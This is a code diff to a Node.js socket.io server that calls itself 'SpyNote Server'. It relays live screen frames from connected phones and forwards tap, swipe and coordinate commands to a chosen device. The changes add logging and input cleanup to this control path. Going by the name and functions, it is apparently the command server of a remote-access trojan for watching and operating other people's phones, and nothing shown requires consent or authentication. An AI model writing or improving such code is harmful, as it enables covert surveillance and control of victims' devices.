@@ -55,6 +55,8 @@ io.on('connection', (socket) => {
 
     socket.on('screen-frame', (data) => {
         const deviceId = data.deviceId;
+        console.log('📺 Frame from:', deviceId);
+        
         if (devices.has(deviceId)) {
             socket.broadcast.emit('screen-update', {
                 deviceId,
@@ -66,41 +68,43 @@ io.on('connection', (socket) => {
         }
     });
 
-    // 🔥 PERFECT CONTROL HANDLER
+    // 🔥 FIXED CONTROL HANDLER
     socket.on('control', (data) => {
-        console.log('🎮 CONTROL RECEIVED:', JSON.stringify(data, null, 2));
+        console.log('🎮 RAW CONTROL RECEIVED:', JSON.stringify(data, null, 2));
         
-        const { deviceId, action } = data;
+        const { deviceId, action, x, y, startX, startY, endX, endY } = data;
+        console.log('🎮 PARSED -> Device:', deviceId, 'Action:', action);
+        console.log('🎮 COORDS -> x:', x, 'y:', y, 'startX:', startX, 'startY:', startY, 'endX:', endX, 'endY:', endY);
         
-        if (!deviceId || !devices.has(deviceId)) {
-            console.log('❌ Invalid device:', deviceId);
+        if (!devices.has(deviceId)) {
+            console.log('❌ Device not found:', deviceId);
             return;
         }
 
         const targetSocketId = deviceSockets.get(deviceId);
         if (!targetSocketId) {
-            console.log('❌ Socket not found for:', deviceId);
+            console.log('⚠️ Device socket not found:', deviceId);
             return;
         }
 
-        // 🔥 FORWARD EXACT DATA TO DEVICE
-        const controlData = {
+        // 🔥 CLEAN DATA FOR DEVICE
+        const cleanData = {
             action: action,
-            x: data.x,
-            y: data.y,
-            startX: data.startX,
-            startY: data.startY,
-            endX: data.endX,
-            endY: data.endY
+            x: Number(x) || 0,
+            y: Number(y) || 0,
+            startX: Number(startX) || Number(x) || 0,
+            startY: Number(startY) || Number(y) || 0,
+            endX: Number(endX) || 0,
+            endY: Number(endY) || 0
         };
 
-        console.log('📱 FORWARDING TO DEVICE:', JSON.stringify(controlData, null, 2));
-        
+        console.log('✅ SENDING TO DEVICE:', JSON.stringify(cleanData, null, 2));
+
         // Send to specific socket AND room
-        io.to(targetSocketId).emit('control', controlData);
-        io.to(deviceId).emit('control', controlData);
+        io.to(targetSocketId).emit('control', cleanData);
+        io.to(deviceId).emit('control', cleanData);
         
-        console.log('✅ CONTROL SENT to', deviceId);
+        console.log('✅ Control sent to:', deviceId, 'Socket:', targetSocketId);
     });
 
     socket.on('disconnect', () => {
@@ -120,5 +124,5 @@ io.on('connection', (socket) => {
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`🚀 SpyNote Server: http://localhost:${PORT}`);
-    console.log(`📱 TAP/SWIPE/SCROLL/BUTTONS READY!`);
+    console.log(`📱 Multi-device + FULL CONTROL ready!`);
 });
